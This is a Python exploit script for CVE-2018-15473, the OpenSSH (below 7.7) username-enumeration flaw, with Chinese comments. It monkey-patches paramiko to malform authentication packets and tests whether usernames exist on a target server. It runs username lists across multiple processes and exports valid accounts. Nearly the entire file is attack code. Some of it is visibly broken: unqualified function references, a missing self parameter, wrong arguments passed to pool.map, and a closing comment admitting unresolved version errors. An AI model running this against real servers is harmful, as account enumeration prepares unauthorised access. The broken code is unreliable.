#!/usr/bin/env python3
# -*- coding-utf-8 -*-

import sys
import json
import string
import socket
import multiprocessing
from random import randint as rand
from random import choice as choice
import fire
from loguru import logger

import paramiko


class PacketModifier(paramiko.auth_handler.AuthHandler):
    def __init__(self):
        logger.disable("paramiko.transport") # 禁用 paramiko 传输级别日志记录

    @staticmethod
    def add_boolean(*args, **kwargs): # 创建恶意的 "add_boolean" 函数以破坏数据包
        pass

    @staticmethod
    def call_error(*args, **kwargs): # 创建要在用户名无效时调用的函数
        raise BadUsername()

    def malform_packet(*args, **kwargs): # 创建恶意函数以覆盖 MSG_SERVICE_ACCEPT 处理程序
        old_add_boolean = paramiko.message.Message.add_boolean
        paramiko.message.Message.add_boolean = add_boolean
        result  = old_parse_service_accept(*args, **kwargs)
        # 重新分配旧的 add_boolean 函数，以便 start_client 再次起作用
        paramiko.message.Message.add_boolean = old_add_boolean
        return result

    auth_handler = paramiko.auth_handler.AuthHandler
    # 存储函数，将覆盖以使数据包变形
    # old_parse_service_accept = auth_handler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT]
    old_parse_service_accept = getattr(auth_handler, '_handler_table')[paramiko.common.MSG_SERVICE_ACCEPT]

    # 将函数分配给各自的处理程序
    auth_handler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = malform_packet
    auth_handler._handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = call_error

class BadUsername(Exception): # 自定义异常
    def __init__(self):
        pass

class OpenSSHUE(object):
    """
    CVE: CVE-2018-15473 - OpenSSH Username Enumeration - Exploit
    Versions: OpenSSH version < 7.7

    Reference:
        https://www.exploit-db.com/exploits/45233
        https://github.com/Rhynorater/CVE-2018-15473-Exploit
    """

    def __init__(self, ip, username, userList, outputFile, port = 22, threads = 5, outputFormat = "list") -> None:
        """
        Args:
            ip(str) : target ip address or hostname
            port(int) : target port (default is 22)
            threads(int) : number of threads to be used (default is 5)
            username(str) : single username to validate
            userList(str) : list of usernames (one per line) to enumerate through
            outputFile(str) : output file location
            outputFormat(str) : output format (list, json, csv)
        """
        self.ip = ip
        self.port = port
        self.threads = threads
        self.username = username
        self.userList = userList
        self.outputFile = outputFile
        self.outputFormat = outputFormat

    def check_host(self, ip, port):
        sock = socket.socket()
        try:
            sock.connect((ip, port))
            sock.close()
        except socket.error:
            logger.error(f"Connecting to host failed. Please check the specified {ip} and {port}.")
            sys.exit(1)

    def generate_random_username(length_min = 15, length_max = 20):
        random_username_list = []
        for i in range(3):
            user = "".join(choice(string.ascii_lowercase) for x in range(rand(length_min, length_max)))
            random_username_list.append(user)
        return random_username_list

    def check_username(self, ip, port, username, tried = 0):
        sock = socket.socket()
        sock.connect((ip, port))
        transport = paramiko.transport.Transport(sock)
        try:
            transport.start_client()
        except paramiko.ssh_exception.SSHException:
            transport.close()
            if tried < 4:
                tried += 1
                return self.check_username(ip, port, username, tried)
            else:
                logger.error("Failed to negotiate SSH transport")
        try:
            transport.auth_publickey(username, paramiko.RSAKey.generate(1024))
        except BadUsername:
            return (username, False)
        except paramiko.ssh_exception.AuthenticationException:
            return (username, True)
        raise Exception("There was an error. Is this the correct version of OpenSSH?")

    def export_json(self, results):
        data = {"Valid" : [], "Invalid" : []}
        for result in results:
            if result[1] and result[0] not in data['Valid']:
                data['Valid'].append(result[0])
            elif not result[1] and result[0] not in data['Invalid']:
                data['Invalid'].append(result[0])
        return json.dumps(data)
    
    def export_csv(self, results):
        final = "Username, Valid\n"
        for result in results:
            final += f"{result[0]}, {result[1]}\n"
        return final
    
    def export_list(self, results):
        final = ""
        for result in results:
            if result[1]:
                final += f"{result[0]} is a valid user!\n"
            else:
                final += f"{result[0]} is not a valid user!\n"
        return final

    def openssh_username_enum_poc(self, ip, port):
        vulnerable = True
        random_username_list = self.generate_random_username()
        for user in random_username_list:
            result = self.check_username(ip, port, user)
            if result[1]:
                vulnerable = False
        if vulnerable:
            logger.info("Target host is vulnerable to CVE-2018-15473")
        else:
            logger.info("Target host most probably is not vulnerable or already patched, exiting...")
            sys.exit(0)
        return vulnerable

    def openssh_username_enum_exp(self):
        pass

    def main(self):
        self.check_host(self.ip, self.port)
        self.openssh_username_enum_poc(self.ip, self.port)

        result = self.check_username(self.ip, self.port, self.username) # 检查单个用户名
        if result[1]:
            logger.info(f"{result[0]} is a valid user!")
        else:
            logger.info(f"{result[0]} is not a valid user!")

        try:
            with open(self.userList) as f:
                usernames = map(str.strip, f.readlines())
        except IOError:
            logger.error("File doesn't exist or is unreadable.")
            sys.exit(3)
        
        # 将用户名映射到各自的线程
        pool = multiprocessing.Pool(self.threads)
        results = pool.map(self.check_username, usernames)
        try:
            if self.outputFile:
                with open(self.outputFile, "w") as f:
                    if self.outputFormat == "json":
                        f.writelines(self.export_json(results))
                    elif self.outputFormat == "csv":
                        f.writelines(self.export_csv(results))
                    else:
                        f.writelines(self.export_list(results))
                logger.info(f"Results successfully written to {self.outputFile} in {self.outputFormat} form.")
        except IOError:
            logger.error("Cannot write to outputFile.")
            sys.exit(5)


if __name__ == '__main__':
    # paramiko 版本问题 
    # 报错 old_parse_service_accept = getattr(paramiko.auth_handler.AuthHandler, '_handler_table')[paramiko.common.MSG_SERVICE_ACCEPT] TypeError: 'property' object is not subscriptable
    # paramiko 改 2.4.1 后出现的问题
    # 报错 paramiko\hostkeys.py", line 23, in <module> from collections import MutableMapping ImportError: cannot import name 'MutableMapping' from 'collections'
    # 无能为力
    fire.Fire(OpenSSHUE)